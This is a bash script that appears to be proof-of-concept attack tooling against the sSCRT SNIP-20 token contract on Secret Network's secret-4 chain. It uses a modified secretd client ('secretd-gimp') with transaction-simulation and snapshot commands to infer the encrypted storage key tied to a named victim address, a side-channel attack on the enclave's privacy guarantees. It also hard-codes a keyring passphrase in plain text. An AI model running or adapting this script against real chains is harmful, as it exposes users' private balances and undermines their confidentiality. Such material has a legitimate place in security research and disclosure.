#!/bin/bash

ACC1='secret1uh83vxunp4jrnm47744wkzur5cfsfar959c74v'
ACC0='secret1yhj0m3g8qramjjtv7g6quaqzdj77wwls4l555q'
#ACC2='secret1yhj0m3g8qramjjtv7g6quaqzdj77wwls4l555q'
SSCRT="secret1k0jntykt7e4g3y88ltc60czgjuqdy4c9e8fzek"
ADMIN=$ACC0
VICTIM="secret1klkjyu278c72rcwe46el769vgv4vdqjrcg5533"

#SNIP20_ATTACK_DIR=
BACKUP="${SNIP20_ATTACK_DIR:-$HOME/snip20}"
UNIQUE_LABEL=$(date "+%Y-%m-%d-%H:%M:%S")

CHAIN_ID="secret-4"
SECRETD="secretd-gimp --home=/mnt/ssd512/gimp/.secretd"
PASSPHRASE=marsellus

codehash() {
    #set -x
    CODEHASH=$($SECRETD q compute contract-hash $SSCRT)
    echo ${CODEHASH:2}  # strip off the 0x
    #set +x
}

SSCRT_HASH=$(codehash $$SCRT)
echo SSCRT: $SSCRT Hash: $SSCRT_HASH

query_balances() {
    $SECRETD query bank balances $ACC0
    $SECRETD query bank balances $ACC1
    $SECRETD query bank balances $VICTIM
}


query() {
    # set -x
    $SECRETD q compute query $1 $2
    # set +x
}

simulate_tx() {
    TX_JSONFILE=$1
    set -x 
    echo $PASSPHRASE | $SECRETD tx compute simulatetx $TX_JSONFILE --from $ADMIN -y --keyring-backend=file
    set +x
}

set_snapshot() {
  echo $PASSPHRASE | $SECRETD tx compute snapshot --from $ADMIN --keyring-backend=file "snapshot$1" -y > /dev/null
  echo "set_snapshot to snapshot$1"
}

delete_snapshot() {
  echo $PASSPHRASE | $SECRETD tx compute snapshot_clear --from $ADMIN --keyring-backend=file "snapshot$1" -y > /dev/null
  echo "clear_snapshot"
}

generate_and_sign_tx() {
    CONTRACT=$SSCRT
    CODEHASH=$SSCRT_HASH
    FROM=$1
    QUERY=$2
    tmpfile=$(mktemp tmp.XXXXXX.json)
    set -x
    $SECRETD tx compute execute --generate-only $CONTRACT $QUERY --from $FROM --enclave-key io-master-cert.der --chain-id=$CHAIN_ID --code-hash $CODEHASH --label $UNIQUE_LABEL -y > ${tmpfile}
    set +x
    # cat $tmpfile >&2
    echo $PASSPHRASE | $SECRETD tx sign $tmpfile --from $FROM -y --keyring-backend=file --chain-id=$CHAIN_ID > ${tmpfile}_sign.json
    cat ${tmpfile}_sign.json
    rm ${tmpfile}_sign.json $tmpfile
    # set +x
}

generate_and_sign_transfer() {
    FROM=$1
    RECP=$2
    AMT=$3
    generate_and_sign_tx $FROM $'{"transfer":{"recipient":"'$RECP$'","amount":"'$AMT$'","memo":""}}'
}

clear_snapshot() {
    rm $BACKUP/simulate_result
    rm $BACKUP/victim_key
    rm $BACKUP/adv_key
    rm $BACKUP/adv_value
    rm $BACKUP/kv_store
    touch $BACKUP/simulate_result
    touch $BACKUP/victim_key
    touch $BACKUP/adv_key
    touch $BACKUP/adv_value
    touch $BACKUP/kv_store
}

# query_contract $SSCRT_ADDR "{\"exchange_rate\":{}}"
query $SSCRT "{\"exchange_rate\":{}}"

#  The account number of the signing account
generate_and_sign_transfer $ACC0 $VICTIM 10000 > tmp.send1.json

#query $SSCRT $'{"balance":{"address":"'$ACC1$'","key":"marsellus_viewing_key"}}'

generate_and_sign_transfer $ACC1 $ACC0 10 > tmp.send2.json

init_balance=10000

# Get the encrypted field name corresponding to the ADV's balance
clear_snapshot
set_snapshot "${UNIQUE_LABEL}-boost"

infer_key() {
    VICTIM=$1
    echo $VICTIM > $BACKUP/victim_key
    generate_and_sign_transfer $ACC0 $VICTIM 10000 > tmp.send1.json
    simulate_tx tmp.send1.json
    res=$(cat $BACKUP/simulate_result)
    cat $BACKUP/kv_store
}

infer_key $ACC0
# infer_key $VICTIM
